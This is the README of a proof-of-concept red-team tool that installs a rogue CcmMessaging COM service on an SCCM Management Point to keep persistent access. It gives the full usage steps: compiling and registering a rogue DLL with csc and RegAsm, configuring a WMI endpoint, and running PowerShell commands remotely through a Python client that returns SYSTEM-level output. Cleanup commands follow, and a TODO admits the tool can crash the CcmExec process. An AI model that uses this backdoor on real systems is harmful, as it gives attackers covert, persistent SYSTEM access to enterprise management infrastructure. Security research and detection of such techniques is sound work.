# CcmMessagingBackdoor

Proof of Concept tooling to build and install a rogue CcmMessaging service to maintain access on a Management Point

## Usage


- Compile and install the rogue COM service on the Management Point
```powershell
# Compile
PS C:\> C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /t:library /out:c:\rogue.dll RogueCcmEndpoint.cs

# Register CLSID
PS C:\> C:\Windows\Microsoft.NET\Framework64\v2.0.50727\RegAsm.exe /codebase c:\rogue.dll
```

- Configure the service endpoint in WMI
```powershell
PS C:\>  ./wmi_create_rogue_service_endpoint.ps1
```

- Use the Python client to run powershell commands
```bash
$ python3 ccmmessaging_backdoor_client.py -t https://mp.corp.local -s MP_Backdoor 'whoami'
[...]
<BackdoorResponse>nt authority\system
</BackdoorResponse>
```

- To clean

```powershell
# Unregister CLSID
PS C:\> C:\Windows\Microsoft.NET\Framework64\v2.0.50727\RegAsm.exe /unregister c:\rogue.dll

PS C:\> ./wmi_remove_rogue_service_endpoint.ps1
```

## TODO
- [ ] Fix random crash of CcmExec process (unknown reason atm)